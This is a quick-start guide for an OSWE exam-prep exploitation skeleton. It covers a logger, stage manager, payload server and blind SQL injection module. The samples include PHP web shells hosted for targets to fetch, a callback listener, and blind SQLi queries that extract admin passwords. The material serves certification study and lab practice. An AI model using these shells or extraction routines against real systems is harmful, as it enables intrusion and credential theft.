# Quick Start Guide - OSWE Advanced Skeleton

**Get up and running in 5 minutes**

## Installation

```bash
cd /home/simon/code/OSWE-Prep/poc-examples/advanced-skeleton

# No dependencies required for basic usage
# Optional: For async SQLi
pip3 install aiohttp
```

## Test the Skeleton

### 1. Test Individual Modules

```bash
# Test logger
python3 modules/logger.py

# Test payload server
python3 modules/payload_server.py
# In another terminal: curl http://localhost:8000/shell.php

# Test stage management
python3 modules/stages.py

# Test SQLi (requires vulnerable target)
# python3 modules/sqli.py
```

### 2. Run Example Exploitation

```bash
# Full exploitation example
python3 examples/example_full_exploitation.py --target-ip 192.168.1.100
```

### 3. Customize for Your Vulnerability

```bash
# Copy the skeleton
cp poc_advanced.py my_exploit.py

# Edit stage functions
vim my_exploit.py

# Find and modify:
# - def stage_exploit(ctx, manager)
# - def stage_verify(ctx, manager)
```

## Module Usage Examples

### Logger

```python
from modules import create_logger

log = create_logger("test")
log.stage("Recon")
log.info("Scanning...")
log.success("Found SQLi!")
log.close()
```

**Output:**
```
==================================================
Stage 1: Recon
==================================================
[*] Scanning...
[+] Found SQLi!
```

**Log File:** `Logs/test_TIMESTAMP.log`

### Payload Server

```python
from modules import PayloadServer

server = PayloadServer(port=8000)
server.add_payload("/shell.php", "<?php system($_GET['c']); ?>")
server.start(blocking=False)

print(f"Shell: {server.get_url('/shell.php')}")
# Shell: http://192.168.1.5:8000/shell.php

# Later...
server.stop()
```

### Stage Manager

```python
from modules import StageManager

manager = StageManager()

@manager.stage("Stage 1")
def stage1(ctx):
    print("Executing stage 1")
    return True

@manager.stage("Stage 2", depends_on=["Stage 1"])
def stage2(ctx):
    print("Executing stage 2")
    return True

manager.execute(None)
```

### Blind SQLi

```python
from modules import BlindSQLi, MySQLDialect

sqli = BlindSQLi(
    url="http://target/vuln.php?id=1",
    dialect=MySQLDialect(),
    delay=2
)

# Extract with binary search (fast!)
password = sqli.extract("SELECT password FROM users LIMIT 1")
print(f"Password: {password}")
```

## Common Customizations

### 1. Add Custom Stage

```python
def stage_my_exploit(ctx: ExploitContext, manager: StageManager) -> bool:
    """My custom exploitation logic."""
    ctx.logger.info("Exploiting vulnerability...")

    # Your code here
    exploit_url = f"{ctx.get_base_url()}/vuln"
    response = ctx.session.get(exploit_url)

    if "success" in response.text:
        ctx.logger.success("Exploitation successful!")
        return True
    else:
        ctx.logger.error("Exploitation failed")
        return False

# In main():
manager.add_stage("My Exploit", stage_my_exploit, depends_on=["Authentication"])
```

### 2. Use Blind SQLi

```python
def stage_sqli(ctx: ExploitContext, manager: StageManager) -> bool:
    """Extract data via blind SQLi."""

    sqli = BlindSQLi(
        url=f"{ctx.get_base_url()}/search",
        dialect=PostgreSQLDialect(),
        delay=ctx.delay,
        param_name="q",
        injection_point="test{payload}",
        logger=ctx.logger
    )

    # Extract admin password
    password = sqli.extract(
        "SELECT password FROM users WHERE username='admin'",
        use_binary=True
    )

    ctx.logger.credential("admin", password, "SQLi")
    ctx.password = password

    return True
```

### 3. Host Payload

```python
def stage_payload_server(ctx: ExploitContext, manager: StageManager) -> bool:
    """Setup payload server."""

    server = PayloadServer(port=ctx.payload_port, verbose=False)

    # Add shell
    shell = "<?php system($_REQUEST['cmd']); ?>"
    server.add_payload("/shell.php", shell)

    # Add callback
    def callback(req):
        ctx.logger.success(f"Callback from {req['client']}")

    server.add_callback_handler("/callback", callback)

    server.start(blocking=False)
    ctx.payload_server = server

    ctx.logger.success(f"Server: {server.get_url()}")

    return True
```

## Directory Layout for OSWE Exam

For each exam machine, create:

```
target1/
├── poc.py              # Main exploit (copy from poc_advanced.py)
├── modules/            # Copy entire modules/ directory
│   ├── __init__.py
│   ├── logger.py
│   ├── payload_server.py
│   ├── stages.py
│   └── sqli.py
├── Notes.md            # Manual notes
├── Archives/           # Saved responses, tokens
├── Logs/               # Auto-generated logs
└── Screenshots/        # Exam evidence
```

## Testing Workflow

### 1. Test Connectivity

```bash
python3 poc_advanced.py --target-ip TARGET --help

python3 poc_advanced.py --target-ip TARGET \
    --verbose 2>&1 | tee test.log
```

### 2. Use Burp for Debugging

```bash
# Terminal 1: Start Burp on 127.0.0.1:8080

# Terminal 2: Run exploit with proxy
python3 poc_advanced.py --target-ip TARGET \
    --proxy http://127.0.0.1:8080 \
    --verbose
```

### 3. Iterate on Stages

```python
# Comment out later stages while testing early ones
# manager.add_stage("Recon", stage_recon)
# manager.add_stage("Auth", stage_auth)
# manager.add_stage("Exploit", stage_exploit)  # Test up to here
# # manager.add_stage("Verify", stage_verify)  # Skip for now
```

### 4. Check Logs

```bash
# Logs are automatically saved
ls -lt Logs/

# View latest log
tail -f Logs/advanced_poc_*.log
```

## Common Issues

### Port Already in Use

```bash
# Change payload server port
python3 poc.py --target-ip TARGET --payload-port 8001
```

### SQLi Too Slow

```python
# Reduce delay
sqli = BlindSQLi(url=url, delay=1)  # Default is 3

# Or use async (much faster)
import asyncio
result = asyncio.run(sqli.extract_async(query))
```

### Module Import Errors

```bash
# Make sure you're in the right directory
cd /path/to/advanced-skeleton/

# Or adjust Python path
export PYTHONPATH="${PYTHONPATH}:/path/to/advanced-skeleton"
```

### Stage Dependencies Not Met

```python
# Make stages optional if they're not critical
manager.add_stage("Optional Step", func, optional=True)
```

## Next Steps

1. ✅ Read full documentation: `README.md`
2. ✅ Study module source code in `modules/`
3. ✅ Run example: `examples/example_full_exploitation.py`
4. ✅ Customize `poc_advanced.py` for your target
5. ✅ Practice with vulnerable VMs

## Resources

- **Full README**: `README.md`
- **Module Docs**: `modules/*.py` (well-commented)
- **Examples**: `examples/`
- **Main Guide**: `../OSWE-PoC-Skeleton-Guide.md`

---

**Ready to exploit? Start customizing `poc_advanced.py`! 🎯**
